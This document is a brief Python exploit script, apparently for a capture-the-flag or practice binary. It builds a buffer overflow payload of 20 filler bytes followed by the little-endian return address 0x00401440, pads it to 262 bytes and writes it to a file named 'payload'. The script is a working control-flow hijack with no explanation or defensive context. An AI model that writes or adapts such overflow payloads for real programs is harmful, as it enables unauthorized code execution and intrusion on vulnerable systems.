import os
buff = '1'*20
buff += '\x40\x14\x40\x00'
buff = buff.ljust(262, '1')
with open('payload', 'wb') as f:
    f.write(buff.encode('ascii'))


